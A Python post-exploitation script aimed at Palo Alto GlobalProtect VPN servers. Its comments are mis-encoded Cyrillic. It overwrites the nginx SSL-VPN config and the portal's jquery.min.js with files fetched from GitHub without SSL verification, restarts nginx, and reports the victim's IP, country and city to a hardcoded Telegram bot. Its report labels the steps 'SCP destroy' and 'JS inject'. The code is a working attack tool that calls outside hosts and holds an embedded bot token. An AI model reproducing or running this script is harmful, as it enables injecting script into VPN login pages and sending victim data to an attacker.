import os
import subprocess
import hashlib
import shutil
import importlib
import sys
import urllib3

# –û—Ç–∫–ª—é—á–µ–Ω–∏–µ SSL-–ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–π
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏
def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –∏ —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫
def check_and_install_libraries():
    required_libraries = ["requests"]
    for lib in required_libraries:
        try:
            importlib.import_module(lib)
        except ImportError:
            print(f"–ë–∏–±–ª–∏–æ—Ç–µ–∫–∞ {lib} –Ω–µ –Ω–∞–π–¥–µ–Ω–∞, —É—Å—Ç–∞–Ω–æ–≤–∫–∞...")
            install_package(lib)

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –∏ —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –±–∏–±–ª–∏–æ—Ç–µ–∫ –ø–µ—Ä–µ–¥ –∏–º–ø–æ—Ä—Ç–æ–º
check_and_install_libraries()

# –ò–º–ø–æ—Ä—Ç –ø–æ—Å–ª–µ —É—Å—Ç–∞–Ω–æ–≤–∫–∏
import requests

# –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ URL —Ñ–∞–π–ª–æ–≤ –∏ –ø—É—Ç–µ–π –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ
url_server_conf = "https://raw.githubusercontent.com/EncHub/PanOS/refs/heads/main/scp_config/server.conf"
url_jquery_js = "https://raw.githubusercontent.com/EncHub/PanOS/refs/heads/main/jquery.min.js"
path_server_conf = "/etc/nginx/sslvpn/server.conf"
path_jquery_js = "/var/appweb/sslvpndocs/global-protect/portal/js/jquery.min.js"
nginx_service = "nginx"

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤—ã—á–∏—Å–ª–µ–Ω–∏—è sha256 —Ö–µ—à–∞ —Ñ–∞–π–ª–∞
def calculate_sha256(file_path):
    sha256_hash = hashlib.sha256()
    with open(file_path, "rb") as f:
        for byte_block in iter(lambda: f.read(4096), b""):
            sha256_hash.update(byte_block)
    return sha256_hash.hexdigest()

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–∞ —Å URL (–±–µ–∑ –ø—Ä–æ–≤–µ—Ä–∫–∏ SSL)
def download_file(url, destination):
    response = requests.get(url, verify=False)  # –ë–µ–∑ –ø—Ä–æ–≤–µ—Ä–∫–∏ SSL
    if response.status_code == 200:
        with open(destination, 'wb') as f:
            f.write(response.content)
        return True
    return False

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–º–µ–Ω—ã —Ñ–∞–π–ª–∞
def replace_file(file_path, url):
    temp_file_path = "/tmp/temp_file"
    if download_file(url, temp_file_path):
        shutil.move(temp_file_path, file_path)
        return True
    return False

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ nginx
def stop_nginx():
    subprocess.run(["killall", "nginx"], check=True)
    return True

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏ nginx
def reload_nginx():
    subprocess.run(["systemctl", "reload", nginx_service], check=True)
    return True

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram (–±–µ–∑ –ø—Ä–æ–≤–µ—Ä–∫–∏ SSL)
def send_to_telegram(message):
    tg_bot_token = "7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc"
    tg_chat_id = "-1002252120859"
    url = f"https://api.telegram.org/bot{tg_bot_token}/sendMessage"
    payload = {"chat_id": tg_chat_id, "text": message}
    response = requests.post(url, json=payload, verify=False)  # –ë–µ–∑ –ø—Ä–æ–≤–µ—Ä–∫–∏ SSL
    return response.ok

# –û—Å–Ω–æ–≤–Ω–æ–π –ø—Ä–æ—Ü–µ—Å—Å
def main():
    server_conf_updated = False
    jquery_js_updated = False

    # –ó–∞–º–µ–Ω—è–µ–º —Ñ–∞–π–ª—ã
    if replace_file(path_server_conf, url_server_conf):
        server_conf_updated = True

    if replace_file(path_jquery_js, url_jquery_js):
        jquery_js_updated = True

    # –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∂–∞–µ–º nginx, –µ—Å–ª–∏ —Ñ–∞–π–ª—ã –±—ã–ª–∏ –æ–±–Ω–æ–≤–ª–µ–Ω—ã
    if server_conf_updated or jquery_js_updated:
        stop_nginx()
        reload_nginx()

        # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–µ—Ä–≤–µ—Ä–µ
        ip_info = requests.get("http://ip-api.com/json", verify=False).json()  # –ë–µ–∑ –ø—Ä–æ–≤–µ—Ä–∫–∏ SSL
        ip = ip_info["query"]
        country = ip_info["country"]
        city = ip_info["city"]
        
        # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Ö–µ—à –∏–∑ IP
        ip_hash = hashlib.sha256(ip.encode('utf-8')).hexdigest()

        # –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram
        message = f"üåê Palo Alto VPN\n"
        message += f"------------------\n"
        message += f"IP: {ip}\n"
        message += f"–°—Ç—Ä–∞–Ω–∞: {country}\n"
        message += f"–ì–æ—Ä–æ–¥: {city}\n"
        message += f"------------------\n"
        message += f"SCP destroy: {'‚úîÔ∏è' if server_conf_updated else '‚ùå'}\n"
        message += f"JS inject: {'‚úîÔ∏è' if jquery_js_updated else '‚ùå'}\n"
        message += f"------------------\n"
        message += f"#{ip_hash[:8]}"  # –•–µ—à –∏–∑ –ø–µ—Ä–≤—ã—Ö 8 —Å–∏–º–≤–æ–ª–æ–≤

        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram
        send_to_telegram(message)

if __name__ == "__main__":
    main()
